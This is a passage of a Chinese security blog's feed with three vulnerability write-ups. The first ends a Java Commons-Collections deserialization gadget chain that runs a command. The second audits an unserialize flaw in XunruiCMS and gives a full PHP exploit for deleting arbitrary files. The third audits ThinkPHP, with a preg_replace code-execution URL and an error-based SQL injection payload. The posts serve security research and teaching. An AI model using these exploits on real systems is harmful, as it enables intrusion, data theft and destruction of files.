Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Map hashMap1 = new HashMap();        Map hashMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 1);        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        lazyMap2.remove(&quot;yy&quot;);        serialize(hashtable);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/CC.svg" alt="CC"></p><p>五大反序列化利用基类：</p><blockquote><p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p><p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p><p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p><p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p><p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p></blockquote><p>四大Transformer的transform：</p><blockquote><p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。</p><p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）</p><p>3.ConstantTransformer：返回成员变量iConstant的值。</p><p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）</p></blockquote><p>三大Map：</p><blockquote><p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p><p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p><p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迅睿CMS反序列化漏洞</title>
      <link href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="迅睿CMS反序列化漏洞"><a href="#迅睿CMS反序列化漏洞" class="headerlink" title="迅睿CMS反序列化漏洞"></a>迅睿CMS反序列化漏洞</h1><p>测试环境：V 4.6.2 ，目前最新版</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><pre><code>\xunruicms\dayrui\Fcms\Core\Helper.php</code></pre><pre><code class="php">function dr_string2array($data, $limit = &#39;&#39;) &#123;    if (!$data) &#123;        return [];    &#125; elseif (is_array($data)) &#123;        $rt = $data;    &#125; else &#123;        $rt = json_decode($data, true);        if (!$rt) &#123;            $rt = unserialize(stripslashes($data));        &#125;    &#125;    if (is_array($rt) &amp;&amp; $limit) &#123;        return dr_arraycut($rt, $limit);    &#125;    return $rt;&#125;</code></pre><p>这里的<strong>unserialize</strong>函数里面存在一个<code>stripslashes</code>函数，这个可以绕过，只有将$data中的<code>\</code>修改为<code>\\</code>即可,在此之前，需要解决</p><p><code>json_decode</code>的问题，正常的json字符串会被解析，然后返回解析的值，如果传入的是不正常的字符串，它会解析失败，返回false，然后才能进入<code>unserialize</code></p><p>在这个过程中，$data并没有其他过多的检查，从而造成了反序列化漏洞</p><h2 id="传参入口寻找"><a href="#传参入口寻找" class="headerlink" title="传参入口寻找"></a>传参入口寻找</h2><p>为了能够利用这个unserialize函数，必须找到$data的输入点，ALT+F7搜索<code>dr_string2array</code>函数,找到了许多结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712092809189.png" alt="image-20230712092809189"></p><p>找了很多,发现只有这个函数操作性比较强，其他的调用有许多是不可控的，或者是过滤</p><pre><code>xunruicms\dayrui\Fcms\Control\Admin\Field.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712093851847.png" alt="image-20230712093851847"></p><p>看看这个<code>import_add</code>方法</p><p>首先，先判断是不是post请求，进入if语句，然后接收一个post参数code ， 然后通过<code>\r\n</code>对字符串进行分割，变为数组</p><p>如果post的code有数值，就不会进入if(!$arr),  绕后就遍历这个数组，把数组中的每一个数值都传到<code>dr_string2array</code>中，然后就是触发反序列化</p><p>下一个问题，如何才能进入这个<code>import_add</code>函数呢</p><p>在路由解析的过程中会接收两个参数，<code>c</code>和<code>m</code>    其中c获取的是类名，m获取的是方法名 ，获取之后会调用对应方法</p><p>尝试访问</p><pre><code>http://127.0.0.1/?c=field&amp;m=import_add</code></pre><p>出现404</p><p>观察一下目录，因为这个field类在Admin目录里面的,可能要访问admin.php</p><pre><code>http://127.0.0.1/admin3a609e1d6cff.php?c=field&amp;m=import_add</code></pre><p>在没有登录的情况下，会跳转到登录入口，所以要先登录管理员账号，可以通过下断点查看有没有执行到import_add方法</p><pre><code>POST ?/admin3a609e1d6cff.php?c=field&amp;m=import_addcode = xxxx</code></pre><h2 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h2><p>第一步寻找**__destruct()**方法，只有5个，一个一个找</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712102701002.png" alt="image-20230712102701002"></p><p>第一个</p><pre><code class="php">public function __destruct()    &#123;        if ($this-&gt;memcached instanceof Memcached) &#123;            $this-&gt;memcached-&gt;quit();        &#125; elseif ($this-&gt;memcached instanceof Memcache) &#123;            $this-&gt;memcached-&gt;close();        &#125;    &#125;</code></pre><p>这个<code>$this-&gt;memcached</code>可控，但是要是Memcached 或 Memcached的实例 ，操作空间不大 pass</p><p>第二个</p><pre><code class="php">public function __destruct()    &#123;        if (is_resource($this-&gt;SMTPConnect)) &#123;            try &#123;                $this-&gt;sendCommand(&#39;quit&#39;);            &#125; catch (ErrorException $e) &#123;                $protocol = $this-&gt;getProtocol();                $method   = &#39;sendWith&#39; . ucfirst($protocol);                log_message(&#39;error&#39;, &#39;Email: &#39; . $method . &#39; throwed &#39; . $e);            &#125;        &#125;    &#125;</code></pre><p><code>$this-&gt;SMTPConnect</code>可控，但是要是一个资源类型，后面进入<code>sendCommand</code>方法，里面操作空间不大 pass</p><p>第三个</p><pre><code class="php">public function __destruct()    &#123;        if (isset($this-&gt;scratch)) &#123;            self::wipeDirectory($this-&gt;scratch);            $this-&gt;scratch = null;        &#125;    &#125;</code></pre><p>这个会调用<code>self::wipeDirectory</code> ,$this-&gt;scratch可控，跟进查看</p><pre><code class="php">private static function wipeDirectory(string $directory): void    &#123;        if (is_dir($directory)) &#123;            // Try a few times in case of lingering locks            $attempts = 10;            while ((bool) $attempts &amp;&amp; ! delete_files($directory, true, false, true)) &#123;                // @codeCoverageIgnoreStart                $attempts--;                usleep(100000); // .1s                // @codeCoverageIgnoreEnd            &#125;            @rmdir($directory);        &#125;    &#125;</code></pre><p>这里调用了<code>delete_files</code>似乎可以进行文件删除，继续跟进<code>delete_files</code>  </p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Helpers\filesystem_helper.phpfunction delete_files(string $path, bool $delDir = false, bool $htdocs = false, bool $hidden = false): bool    &#123;        $path = realpath($path) ?: $path;        $path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;        try &#123;            foreach (new RecursiveIteratorIterator(                new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),                RecursiveIteratorIterator::CHILD_FIRST            ) as $object) &#123;                $filename = $object-&gt;getFilename();                if (! $hidden &amp;&amp; $filename[0] === &#39;.&#39;) &#123;                    continue;                &#125;                if (! $htdocs || ! preg_match(&#39;/^(\.htaccess|index\.(html|htm|php)|web\.config)$/i&#39;, $filename)) &#123;                    $isDir = $object-&gt;isDir();                    if ($isDir &amp;&amp; $delDir) &#123;                        rmdir($object-&gt;getPathname());                        continue;                    &#125;                    if (! $isDir) &#123;                        unlink($object-&gt;getPathname());                    &#125;                &#125;            &#125;            return true;        &#125; catch (Throwable $e) &#123;            return false;        &#125;    &#125;</code></pre><ol><li><p>首先，使用 <code>realpath($path) ?: $path</code> 将传入的 <code>$path</code> 转换为绝对路径，如果转换失败，则保留原始路径。</p></li><li><p>然后，使用 <code>rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR</code> 将路径末尾的目录分隔符删除，并在末尾添加一个目录分隔符。</p></li><li><p>接下来，使用<code>RecursiveDirectoryIterator</code></p><p>类和<code>RecursiveIteratorIterator</code></p><p>类遍历指定路径下的所有文件和目录。</p><ul><li><code>RecursiveDirectoryIterator</code> 用于递归地遍历目录，并跳过 “.” 和 “..” 目录。</li><li><code>RecursiveIteratorIterator</code> 使用 <code>CHILD_FIRST</code> 模式，确保先处理子目录中的文件和目录，然后再处理父目录中的文件和目录。</li></ul></li><li><p>对于遍历到的每个文件或目录<code>$object</code>执行以下操作：</p><ul><li>获取文件名 <code>$filename = $object-&gt;getFilename()</code>。</li><li>如果 <code>$hidden</code> 为 <code>false</code>，并且文件名以 <code>.</code> 开头，则跳过当前循环，不处理该文件。</li><li>如果 <code>$htdocs</code> 为 <code>true</code>，并且文件名匹配 <code>.htaccess</code>、<code>index.html</code>、<code>index.htm</code>、<code>index.php</code> 和 <code>web.config</code> 则跳过当前循环，不处理该文件。</li><li>检查文件类型：<ul><li>如果是目录且 <code>$delDir</code> 为 <code>true</code>，则使用 <code>rmdir($object-&gt;getPathname())</code> 删除目录，并继续下一次循环。</li><li>如果不是目录，则使用 <code>unlink($object-&gt;getPathname())</code> 删除文件。</li></ul></li></ul></li><li><p>循环结束后，返回 <code>true</code> 表示删除操作成功。</p></li><li><p>如果在删除过程中发生任何异常（<code>Throwable</code>），则捕获异常，并返回 <code>false</code> 表示删除操作失败。</p></li></ol><p>写poc试了一下，发现没有在<code>wipeDirectory</code>中没有进入<code>delete_files</code>中，报错了，函数导向错误</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712111020382.png" alt="image-20230712111020382"></p><p>因为<code>delete_files</code>并不存在于某个类里面，只是一个函数，要利用这个方法需要引用它所在的文件，利用的类里面已经引用了这个文件，就是不跳转TT^TT</p><p>第四个</p><pre><code class="php">public function __destruct()    &#123;        unset($this-&gt;data);        unset($this-&gt;cache);        unset($this-&gt;ret);        unset($this-&gt;icon);        unset($this-&gt;result_array);        unset($this-&gt;nbsp_str);        unset($this-&gt;nbsp);        unset($this-&gt;result);    &#125;</code></pre><p>这个只是用来释放变量，没操作空间 ，pass</p><p>第五个</p><pre><code class="php">public function __destruct()    &#123;        if (isset($this-&gt;redis)) &#123;            $this-&gt;redis-&gt;close();        &#125;    &#125;</code></pre><p>这个<code>$this-&gt;redis</code>可控，这里有两个方向，一个触发某个类的**__call()** , 另外一个是找到一个含有**close()**方法的类</p><p>经过一番查找，没有找到能利用的**__call()** ，只好去看看close()了</p><p>全局搜索close()方法找到了15个方法，其中有7个是js文件的，忽略</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712114207860.png" alt="image-20230712114207860"></p><p>经过一番查找，找到这个可以用</p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Session\Handlers\MemcachedHandler.phppublic function close(): bool    &#123;        if (isset($this-&gt;memcached)) &#123;            if (isset($this-&gt;lockKey)) &#123;                $this-&gt;memcached-&gt;delete($this-&gt;lockKey);            &#125;            if (! $this-&gt;memcached-&gt;quit()) &#123;                return false;            &#125;            $this-&gt;memcached = null;            return true;        &#125;        return false;    &#125;</code></pre><p>这里的<code>$this-&gt;memcached</code>和<code>$this-&gt;lockKey</code>都可控，这里也可以触发任意类的**__call**方法，也可以触发任意类的<code>delete()</code>和<code>quit()</code>方法</p><p>这里优先选择<code>delete()</code> ,因为其参数<code>$this-&gt;lockKey</code>可控</p><p>全局搜索<code>delete()</code>方法,找到这个</p><pre><code class="php">public function delete() &#123;        @unlink($this-&gt;fullname);    &#125;</code></pre><p><code>$this-&gt;fullname</code>可控，这里可以任意文件删除了，但是这是无参数方法，不能跳转到这利用</p><p>还一个：</p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Cache\Handlers\FileHandler.phppublic function delete(string $key)    &#123;        $key = static::validateKey($key, $this-&gt;prefix);        return is_file($this-&gt;path . $key) &amp;&amp; unlink($this-&gt;path . $key);    &#125;</code></pre><p>其中$key是上面传来的参数<code>$this-&gt;lockKey</code> 并且<code>$this-&gt;prefix</code>和<code>$this-&gt;path</code>也可控 ，可以看到后面会将<code>$this-&gt;path</code>和<code>$key</code>进行拼接，进行判断是否是文件，如果是文件则调用<code>unlink</code>方法进行文件删除</p><p>现在主要关注<code>validateKey</code>方法对$key的处理</p><pre><code class="php">public static function validateKey($key, $prefix = &#39;&#39;): string    &#123;        if (! is_string($key)) &#123;            throw new InvalidArgumentException(&#39;Cache key must be a string&#39;);        &#125;        if ($key === &#39;&#39;) &#123;            throw new InvalidArgumentException(&#39;Cache key cannot be empty.&#39;);        &#125;        $reserved = config(&#39;Cache&#39;)-&gt;reservedCharacters ?? self::RESERVED_CHARACTERS;        if ($reserved &amp;&amp; strpbrk($key, $reserved) !== false) &#123;            throw new InvalidArgumentException(&#39;Cache key contains reserved characters &#39; . $reserved);        &#125;        // If the key with prefix exceeds the length then return the hashed version        return strlen($prefix . $key) &gt; static::MAX_KEY_LENGTH ? $prefix . md5($key) : $prefix . $key;    &#125;</code></pre><p>这个方法，在确保传入的$key不为空，并且是字符串的前提下，才能正常进行下面操作</p><pre><code>$reserved = config(&#39;Cache&#39;)-&gt;reservedCharacters ?? self::RESERVED_CHARACTERS;</code></pre><p>获取配置中的保留字符列表。如果 <code>config(&#39;Cache&#39;)-&gt;reservedCharacters</code> 存在，则将其赋值给 <code>$reserved</code>；否则，使用 <code>self::RESERVED_CHARACTERS</code> 的默认值。</p><pre><code class="php">public string $reservedCharacters = &#39;&#123;&#125;()/\@:&#39;;</code></pre><pre><code class="php">return strlen($prefix . $key) &gt; static::MAX_KEY_LENGTH ? $prefix . md5($key) : $prefix . $key;</code></pre><ul><li>首先，计算添加前缀后键的长度是否大于预定义的最大键长度 <code>static::MAX_KEY_LENGTH</code>。</li><li>如果大于最大键长度，则返回将 <code>$prefix . md5($key)</code> 处理后的哈希值作为缓存键。这是为了确保最终返回的键不会超过最大键长度。</li><li>如果小于等于最大键长度，则返回将 <code>$prefix . $key</code> 拼接作为缓存键</li></ul><p>经过测试，在delete方法中，如果传入<code>$key</code>为要删除的文件名，在经过<code>validateKey</code>处理后，不会对key照常改变，直接返回<code>key</code>,而<code>$this-&gt;prefix</code>不需要修改，默认就行</p><p>在拼接文件路径的<code>$this-&gt;path</code> 可以是绝对路径，也可以是相对路径，默认是public目录下</p><p>在写exp的过程中，遇到一个问题，就是类的属性都是<strong>protected</strong>类型的，不能直接修改值</p><p>因为这个cms安装条件是PHP7.4+   , 由于<strong>PHP7.1+<strong>对属性类型不敏感 ， 可以将<code>protected</code>修改为</strong>public</strong>类型</p><p>最后的exp</p><pre><code class="php">//任意文件删除&lt;?phpnamespace CodeIgniter\Cache\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;use CodeIgniter\Session\Handlers\MemcachedHandler;class RedisHandler extends BaseHandler&#123;    public $redis;    public function __construct()    &#123;        $this-&gt;redis =new MemcachedHandler();    &#125;&#125;namespace CodeIgniter\Session\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;use CodeIgniter\Cache\Handlers\FileHandler;class MemcachedHandler extends BaseHandler&#123;    public $memcached ;    public $lockKey ;    public function __construct()    &#123;        $this-&gt;memcached=new FileHandler();        $this-&gt;lockKey = &quot;1.txt&quot;; //文件名    &#125;&#125;namespace CodeIgniter\Session\Handlers;abstract class BaseHandler&#123;&#125;namespace CodeIgniter\Cache\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;class FileHandler extends BaseHandler&#123;    public $path;    public function __construct()    &#123;        $this-&gt;path=&quot;./&quot;; //路径    &#125;&#125;use CodeIgniter\Cache\Handlers\RedisHandler;$str =  serialize(new RedisHandler());$newStr = str_replace(&#39;\\&#39;, &#39;\\\\&#39;, $str);echo urlencode($newStr).&quot;\n&quot;;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 代码审计</title>
      <link href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP代码审计"><a href="#ThinkPHP代码审计" class="headerlink" title="ThinkPHP代码审计"></a>ThinkPHP代码审计</h1><p><img src="https://image.3001.net/images/20200908/1599567391.png" alt="img"></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>URL和路由：<a href="https://blog.csdn.net/lthirdonel/article/details/88775620">https://blog.csdn.net/lthirdonel/article/details/88775620</a></p><p>thinkphp内置了几种方法，在<code>ThinkPHP/Common/functions.php</code>，比如I()，M()等等</p><pre><code>A 快速实例化Action类库 B 执行行为类 C 配置参数存取方法 D 快速实例化Model类库 F 快速简单文本数据存取方法 I http获取参数L 语言参数存取方法 M 快速高性能实例化模型 R 快速远程调用Action类方法 S 快速缓存存取方法 U URL动态生成和重定向方法 W 快速Widget输出方法</code></pre><h2 id="ThinkPHP-2-x"><a href="#ThinkPHP-2-x" class="headerlink" title="ThinkPHP 2.x"></a>ThinkPHP 2.x</h2><h3 id="preg-replace-x2F-e模式代码执行漏洞"><a href="#preg-replace-x2F-e模式代码执行漏洞" class="headerlink" title="preg_replace &#x2F;e模式代码执行漏洞"></a>preg_replace &#x2F;e模式代码执行漏洞</h3><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><p>在2.1版本中存在大量preg_replace()函数使用了<code>/e</code>模式，如果参数可控，有可能存在任意代码执行漏洞（php&lt;7）</p><p>下面的<code>@e</code>和<code>/e</code>是一样的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703120726229.png" alt="image-20230703120726229"></p><p>在<code>ThinkPHP/Lib/Think/Util/Dispatcher.class.php</code>中，Dispatcher类的dispatch方法里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703121414905.png" alt="image-20230703121414905"></p><p><code>Dispatcher.class.php</code> 文件负责接收用户发送的请求，并根据路由规则将请求分发到相应的控制器（Controller）和方法（Action）。它会解析 URL，并根据定义的路由规则进行匹配，然后确定要执行的控制器和方法。</p><p>根据ThinkPHP对路由的解析，对这部分代码进行调试和分析</p><pre><code>http://xx.xx.xx.xx/index.php/模块/控制器/操作http://127.0.0.1/index.php/a/b/c/d</code></pre><p>首先，通过 <code>C(&#39;URL_MODEL&#39;)</code> 获取 URL 的模式，然后根据不同的模式进行不同的处理，这里是默认模式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141034997.png" alt="image-20230703141034997"></p><p>接下来，如果配置文件中开启了子域名部署（<code>APP_SUB_DOMAIN_DEPLOY</code> 为真），则会根据规则对子域名进行路由处理。这里为false，直接跳过了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141414294.png" alt="image-20230703141414294"></p><p>然后根据配置文件中的设置获取 URL 的分隔符 (<code>URL_PATHINFO_DEPR</code>)，并调用 <code>getPathInfo()</code> 函数来分析 URL 的 PATHINFO 信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141608989.png" alt="image-20230703141608989"></p><p>接下来是路由检测和解析的部分。首先会调用 <code>routerCheck()</code> 函数检测是否有自定义的路由规则。如果没有自定义的路由规则，则按照默认规则进行调度。它会先根据 URL 分隔符将 <code>$_SERVER[&#39;PATH_INFO&#39;]</code> 进行切割，得到一个路径的数组 <code>$paths</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141759745.png" alt="image-20230703141759745"></p><p>然后到preg_replace函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141926792.png" alt="image-20230703141926792"></p><p>在<code>preg_replace()</code>函数中，正则表达式中使用了&#x2F;e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串</p><p>上面正则表达式可以简化为<code>\w+/([\^\/])</code>，即搜索获取“&#x2F;”前后的两个参数，$var[‘\1’]&#x3D;”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/d&#39;);</code></pre><p>在PHP当中，${}是可以构造一个变量的，{}写的是一般的字符，那么就会被当成变量，比如${a}等价于$a，那如果{}写的是一个已知函数名称呢？那么这个函数就会被执行</p><p>所以只要构造成这样：</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/$&#123;phpinfo()&#125;&#39;);</code></pre><p>访问：<code>http://127.0.0.1/index.php/a/b/c/$&#123;phpinfo()&#125;</code>出现报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143247858.png" alt="image-20230703143247858"></p><p>加上<code>@</code>进行错误抑制即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143407449.png" alt="image-20230703143407449"></p><p>后面版本的更新中，<code>preg_replace</code>被替换了：</p><p>输入的${phpinfo()}被当成了字符串被strip_tags()处理了</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=strip_tags(\&#39;\\2\&#39;);&#39;, implode($depr,$paths));</code></pre><h2 id="ThinkPHP-3-x"><a href="#ThinkPHP-3-x" class="headerlink" title="ThinkPHP 3.x"></a>ThinkPHP 3.x</h2><h3 id="3-2-3-where-注入"><a href="#3-2-3-where-注入" class="headerlink" title="3.2.3 where 注入"></a>3.2.3 where 注入</h3><p>配置控制器和数据库</p><p><code>Application/Home/Controller/IndexController.class.php</code></p><pre><code class="php">public function index()&#123;$data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));var_dump($data);&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174513551.png" alt="image-20230703174513551"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174604563.png" alt="image-20230703174604563"></p><p>访问测试：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174640702.png" alt="image-20230703174640702"></p><p>对传入<code>id=1</code>，跟着调试看看</p><pre><code class="php">public function index()    &#123;        $data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));        var_dump($data);    &#125;</code></pre><p>首先调用了M()方法,大概就是连接数据库，创建Model对象，位置在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><pre><code class="php">/** * 实例化一个没有模型文件的Model * @param string $name Model名称 支持指定基础模型 例如 MongoModel:User * @param string $tablePrefix 表前缀 * @param mixed $connection 数据库连接信息 * @return Think\Model */function M($name = &#39;&#39;, $tablePrefix = &#39;&#39;, $connection = &#39;&#39;)&#123;    static $_model = array();    if (strpos($name, &#39;:&#39;)) &#123;        list($class, $name) = explode(&#39;:&#39;, $name);    &#125; else &#123;        $class = &#39;Think\\Model&#39;;    &#125;    $guid = (is_array($connection) ? implode(&#39;&#39;, $connection) : $connection) . $tablePrefix . $name . &#39;_&#39; . $class;    if (!isset($_model[$guid])) &#123;        $_model[$guid] = new $class($name, $tablePrefix, $connection);    &#125;    return $_model[$guid];&#125;</code></pre><p>结束后调用I()方法，获取和解析http请求GET id的值，这里面调用了下面的方法进行安全过滤</p><pre><code class="php">function think_filter(&amp;$value)&#123;    // TODO 其他安全过滤    // 过滤查询特殊字符    if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;        $value .= &#39; &#39;;    &#125;</code></pre><p>然后调用Model()类的find()方法，将传入的id做为参数，又会经过<code>ThinkPHP/Library/Think/Model.class.php</code>的 <code>_parseOptions()</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703200750666.png" alt="image-20230703200750666"></p><p>跟进这个方法：</p><p>里面存在字段类型验证</p><pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;])) &#123;            // 对数组查询条件进行字段类型检查            foreach ($options[&#39;where&#39;] as $key =&gt; $val) &#123;                $key = trim($key);                if (in_array($key, $fields, true)) &#123;                    if (is_scalar($val)) &#123;                        $this-&gt;_parseType($options[&#39;where&#39;], $key);                    &#125;                &#125; elseif (!is_numeric($key) &amp;&amp; &#39;_&#39; != substr($key, 0, 1) &amp;&amp; false === strpos($key, &#39;.&#39;) &amp;&amp; false === strpos($key, &#39;(&#39;) &amp;&amp; false === strpos($key, &#39;|&#39;) &amp;&amp; false === strpos($key, &#39;&amp;&#39;)) &#123;                    if (!empty($this-&gt;options[&#39;strict&#39;])) &#123;                        E(L(&#39;_ERROR_QUERY_EXPRESS_&#39;) . &#39;:[&#39; . $key . &#39;=&gt;&#39; . $val . &#39;]&#39;);                    &#125;                    unset($options[&#39;where&#39;][$key]);                &#125;            &#125;        &#125;</code></pre><p>其中<code>_parseType()</code>函数</p><pre><code class="php">protected function _parseType(&amp;$data, $key)    &#123;        if (!isset($this-&gt;options[&#39;bind&#39;][&#39;:&#39; . $key]) &amp;&amp; isset($this-&gt;fields[&#39;_type&#39;][$key])) &#123;            $fieldType = strtolower($this-&gt;fields[&#39;_type&#39;][$key]);            if (false !== strpos($fieldType, &#39;enum&#39;)) &#123;                // 支持ENUM类型优先检测            &#125; elseif (false === strpos($fieldType, &#39;bigint&#39;) &amp;&amp; false !== strpos($fieldType, &#39;int&#39;)) &#123;                $data[$key] = intval($data[$key]);            &#125; elseif (false !== strpos($fieldType, &#39;float&#39;) || false !== strpos($fieldType, &#39;double&#39;)) &#123;                $data[$key] = floatval($data[$key]);            &#125; elseif (false !== strpos($fieldType, &#39;bool&#39;)) &#123;                $data[$key] = (bool) $data[$key];            &#125;        &#125;    &#125;</code></pre><p>在这把id进行了强制类型转换，然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询避免了注入问题。</p><p>理一下 传入<code>id=1 </code>-&gt; <code>I()</code> -&gt; <code>find()</code> -&gt; <code>_parseOptions()</code> -&gt; <code>_parseType()</code> 然后将我们的字符串清理了。 要知道id参数被改变的时间点在<code>_parseType()</code>中，那进入这个方法要满足</p><pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;]))</code></pre><p>​<img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204546122.png" alt="image-20230703204546122"></p><p>然后使用报错注入</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703204642573.png" alt="image-20230703204642573"></p><h3 id="3-2-3-exp注入"><a href="#3-2-3-exp注入" class="headerlink" title="3.2.3 exp注入"></a>3.2.3 exp注入</h3><p>配置控制器</p><pre><code class="php">public function 